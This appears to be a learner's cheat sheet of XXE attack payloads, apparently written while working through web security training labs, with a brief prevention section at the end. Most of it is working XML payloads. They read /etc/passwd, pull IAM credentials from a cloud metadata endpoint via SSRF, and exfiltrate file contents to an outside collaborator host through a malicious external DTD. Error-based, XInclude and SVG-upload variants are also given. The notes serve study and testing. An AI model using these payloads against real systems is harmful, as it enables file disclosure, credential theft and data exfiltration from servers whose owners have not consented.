XXE 

Exploiting XXE using external entities to retrieve files

    <?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>

     <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>
------------------------------------------------------------------------

Exploiting XXE to perform SSRF attacks

     <?xml version="1.0" encoding="UTF-8"?>
<stockCheck><productId>381</productId></stockCheck>

     <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck><productId>&xxe;</productId></stockCheck>   

Note : Even if we get Invalid product ID responce, If SSRF URL is correct we can exploit
------------------------------------------------------------------------

Blind XXE 

1. Out-of-band Network | burp collabrator 
2. Triggering error message
------------------------------------------------------------------------

Blind XXE with out-of-band interaction via XML parameter entities
  
   If entities are blocked then we can use parameter entities 

            <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://burp.collabrator.net"> %xxe; ]>
<stockCheck><productId>%xxe;</productId></stockCheck>  
------------------------------------------------------------------------

Exploiting blind XXE to exfiltrate data using a malicious external DTD

First we need to store our malicius DTD in our server 

<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://j4o6w2q82hudj5pmy8vjdyx45vblza.burpcollaborator.net/?x=%file;'>">
%eval;
%exfiltrate;

Then, We need to trigger vulnerable server to initiate request to our malicious server 

     <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0a4100050380eb22c193e3a6016a0084.exploit-server.net/exploit"> %xxe; ]>
<stockCheck><productId>%xxe;</productId><storeId>1</storeId></stockCheck>
------------------------------------------------------------------------

Exploiting blind XXE to retrieve data via error messages

First we need to store our malicius DTD in our server 

<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///iuhgnsdonth/%file;'>">
%eval;
%error;

Then, We need to trigger vulnerable server to initiate request to our malicious server 

      <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "https://exploit-0ade00d7035bb826c1b60c91011c00be.exploit-server.net/exploit"> %xxe; ]>
<stockCheck><productId>%xxe;</productId><storeId>1</storeId></stockCheck>
------------------------------------------------------------------------

Exploiting blind XXE by repurposing a local DTD

For example, suppose there is a DTD file on the server filesystem at the location /usr/local/app/schema.dtd, and this DTD file defines an entity called custom_entity. An attacker can trigger an XML parsing error message containing the contents of the /etc/passwd file by submitting a hybrid DTD like the following

And Use below payload to exploit

<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/local/app/schema.dtd">
<!ENTITY % custom_entity '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>

This DTD carries out the following steps:

    Defines an XML parameter entity called local_dtd, containing the contents of the external DTD file that exists on the server filesystem.
    Redefines the XML parameter entity called custom_entity, which is already defined in the external DTD file. The entity is redefined as containing the error-based XXE exploit that was already described, for triggering an error message containing the contents of the /etc/passwd file.
    Uses the local_dtd entity, so that the external DTD is interpreted, including the redefined value of the custom_entity entity. This results in the desired error message.
------------------------------------------------------------------------

Locating an existing DTD file to repurpose

First need to find some DTD file on target host, for ex: By default every GNOME based linux has usr/share/yelp/dtd/docbookx.dtd DTD file. 

For Checking valid file | Compare with valid file and incalid file like this (///fbgtsn/thfdb/dnbg.dtd)

     <?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> %local_dtd; ]>
<stockCheck><productId>%local_dtd SYSTEM;</productId><storeId>1</storeId></stockCheck>

And use below payload to exploit

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
<!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd">
<!ENTITY % ISOamso '
<!ENTITY &#x25; file SYSTEM "file:///etc/passwd">
<!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>">
&#x25;eval;
&#x25;error;
'>
%local_dtd;
]>
<stockCheck><productId>%local_dtd SYSTEM;</productId><storeId>1</storeId></stockCheck>
------------------------------------------------------------------------

Exploiting XInclude to retrieve files

In some cases server retrive user input as normal parameter value and change that to XML format in backend and pass that for further process. 

ex: POST request contains 2 parameter as below

          productId=1&storeId=1

In this case we should use XInclude payload
  
          <foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>
          
Now change POST request parameter as below  

          productId=<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>&storeId=1

------------------------------------------------------------------------

XXE attacks via file upload

Create a SVG file with XML payload, Below payload is used to directory traversal

      <?xml version="1.0" standalone="yes"?><!DOCTYPE test [ <!ENTITY xxe SYSTEM "file:///etc/hostname" > ]><svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1"><text font-size="16" x="0" y="16">&xxe;</text></svg>

------------------------------------------------------------------------

XXE attacks via modified content type

If server is using Content-Type: application/x-www-form-urlencoded, Then we can try to inject XML payloads by changing content-Type

For ex: If we get both responce same for below 2 requests
    
POST /action HTTP/1.0
Content-Type: application/x-www-form-urlencoded
Content-Length: 7

foo=bar

POST /action HTTP/1.0
Content-Type: text/xml
Content-Length: 52

<?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
------------------------------------------------------------------------

How to find and test for XXE vulnerabilities

1. Testing for file retrival | Use OS default files. 
2. Blind XXE injection | Burp Collabrator 
3. User suplied data change (Xinclude) and Content-Type change

------------------------------------------------------------------------

How to prevent XXE vulnerabilities

Virtually all XXE vulnerabilities arise because the application's XML parsing library supports potentially dangerous XML features that the application does not need or intend to use. The easiest and most effective way to prevent XXE attacks is to disable those features.

Generally, it is sufficient to disable resolution of external entities and disable support for XInclude. This can usually be done via configuration options or by programmatically overriding default behavior. Consult the documentation for your XML parsing library or API for details about how to disable unnecessary capabilities. 
